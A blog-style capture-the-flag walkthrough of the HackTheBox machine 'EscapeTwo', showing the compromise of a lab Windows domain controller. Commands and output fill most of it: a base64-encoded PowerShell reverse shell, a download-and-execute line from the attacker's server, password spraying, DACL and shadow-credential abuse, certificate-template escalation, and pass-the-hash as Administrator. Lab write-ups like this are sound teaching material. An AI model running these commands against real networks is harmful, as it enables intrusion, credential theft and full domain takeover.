---
layout: post
title: "EscapeTwo"
date: 2025-05-30 
categories: ctf
---
# EscapeTwo

First let’s enumerate the open ports:

```bash
sudo nmap -sC -sV 10.10.11.51

result:
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-30 10:07:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-28T04:05:40
|_Not valid after:  2026-05-28T04:05:40
|_ssl-date: 2025-05-30T10:08:22+00:00; +1m47s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-28T04:05:40
|_Not valid after:  2026-05-28T04:05:40
|_ssl-date: 2025-05-30T10:08:22+00:00; +1m47s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-05-30T10:08:22+00:00; +1m47s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-27T20:16:32
|_Not valid after:  2055-05-27T20:16:32
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-28T04:05:40
|_Not valid after:  2026-05-28T04:05:40
|_ssl-date: 2025-05-30T10:08:22+00:00; +1m47s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-28T04:05:40
|_Not valid after:  2026-05-28T04:05:40
|_ssl-date: 2025-05-30T10:08:22+00:00; +1m47s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

We get the domain name sqequel.htb and the machine name DC01.sequel.htb. Let’s add that to our /etc/hosts file.

First let’s query DNS and see if we can get a zone transfer.

```bash
dig sequel.htb @10.10.11.51
```

We get no result.

Let’s now enumerating SMB, we are given credential:

```bash
 rose / KxEPkKe6R8su
```

```bash
nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares

result:
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            

```

Since we have the account, let’s also use rpcclient to get all users on the machine:

```bash
rpcclient -U'rose%KxEPkKe6R8su' 10.10.11.51
enumdomusers

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[michael] rid:[0x44f]
user:[ryan] rid:[0x45a]
user:[oscar] rid:[0x45c]
user:[sql_svc] rid:[0x462]
user:[rose] rid:[0x641]
user:[ca_svc] rid:[0x647]
```

We can also use nxc to do the same:

```bash
nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --users
```

Let’s save the users to users.txt.

Let’s see what’s in the Accounting Department share

```bash
smbclient '//10.10.11.51/Accounting Department' -U rose%KxEPkKe6R8su

smb: \> ls
  .                                   D        0  Sun Jun  9 11:52:21 2024
  ..                                  D        0  Sun Jun  9 11:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 11:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 11:52:07 2024
```

Let’s retrieve both the files and see what’s inside.

Using the file command, we see that both files are actually zip file:

```bash
file accounting_2024.xlsx accounts.xlsx

accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
accounts.xlsx:        Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate

```

Let’s unzip them.

Looking through the files. In one of the files sharedStrings.xml we find username and password for MSSQL:

```bash
angela : 0fwz7Q4mSpurIt99  
oscar  : 86LxLBMgEWaKUnBG  
kevin  : Md9Wlq1E5bZnVDVo  
sa     : MSSQLP@ssw0rd!
```

Now let’s try logging on to mssql:

```bash
sqsh -S 10.10.11.51 -U sa -P 'MSSQLP@ssw0rd!'

SELECT name FROM master.dbo.sysdatabases
go

use msdb
go

SELECT table_name FROM msdb.INFORMATION_SCHEMA.TABLES
go

```

There is around 200 different tables. Let’s see if we can execute commands with nxc, if we can maybe we can get a reverse shell:

```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami

result:
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc

```

It works. 

Let’s get a use a PowerShell one liner to get it to connect back to us.

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
```

Now edit the comments out and change the IP address to our attack box IP. Next let’s base64 encode it:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0 

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANgAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

Now let’s execute it with nxc; also start a listener:

```bash

nc -lnvp 4444

#-X option for powershell execution
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'powershell -enc "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANgAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA="'
```

We now have a shell.

![image.png]({{ site.baseurl }}/assets/escapetwo/image.png)

An alternative way is to host shell.ps1 via python server and use web download method:

```bash
python3 -m http.server 8000

nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.6:8000/shell.ps1')"

```

Now that we are on dc01, let’s check the SQL configuration that’s normally in the C:\ dir. 

We find a file sql-Configuration.INI:

```bash
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Let’s use nxc again and try password spraying the new password we just found:

```bash
crackmapexec smb 10.10.11.51 -u users.txt -p WqSZAF6CysDQbGb3 --continue-on-success 

ryan
sql_svc
```

Now that we have ryan’s password, let’s logon with evil-winrm

```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 
```

Now we see what permissions and rights ryan has. We can use bloodhound to map this.

```bash
bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -ns 10.10.11.51 -d sequel.htb -c all
```

Then we search ryan:

![image.png]({{ site.baseurl }}/assets/escapetwo/image%201.png)

We have WriteOwner permission over ca_svc. Bloodhound also outline how to exploit that right. First we have to change ownership of ca_svc:

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' -dc-ip 10.10.11.51  'sequel.htb/ryan:WqSZAF6CysDQbGb3'
```

Now : To abuse ownership of a user object, you may grant yourself the GenericAll permission.

```bash
impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

Because we have full control now of user ca_svc, we can obtain their NT hash from TGT with the following attack:

**How it’s exploited**:

- If a user (e.g., ryan) has **write permissions** (e.g., WriteProperty or GenericWrite) over the msDS-KeyCredentialLink attribute of another account (e.g., ca_svc), they can add a new key credential.
- The attacker generates a public/private key pair, adds the public key to ca_svc’s msDS-KeyCredentialLink, and uses the private key to request a Kerberos Ticket-Granting Ticket (TGT) as ca_svc via PKINIT.
- With the TGT, the attacker can authenticate as ca_svc and may retrieve its NT hash, enabling further attacks like pass-the-hash or accessing resources ca_svc has permissions for.

```bash
certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.10.11.51  

result:
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce

```

The user ca_svc is a member of Cert Publishers, if we check the description in bloodhound about the group; 

Description:
Members of this group are permitted to publish certificates to the directory

Let’s use certipy to check for vulnerable certificate templates.

```bash
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout -vuln

result:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-05-30T17:41:28+00:00
    Template Last Modified              : 2025-05-30T17:41:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

Since we are in the Cert Publishers group, we have full control of DunderMifflinAuthentication certificate. Let’s update the vulnerable certificate so it allows dangerous settings such as requesting a certificate  for administartor:

```bash
certipy-ad template -u ca_svc@sequ -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -write-default-configuration
```

We should get a success message. Now the cert is vulnerable to ESC1, so we can request a certificate to authenticate as administrator and steal their nt hash. We can verify that the certificate is indeed vulnerable to ESC1

```bash
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout -vuln
result:
<SNIP>
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```

```bash
	certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target-ip 10.10.11.51 

result:
[*] Wrote certificate and private key to 'administrator.pfx'

```

Now we can authenticate as admin and take their ntlm hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51 

result:
aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Now we can use evil-winrm to logon as administrator:

```bash
evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```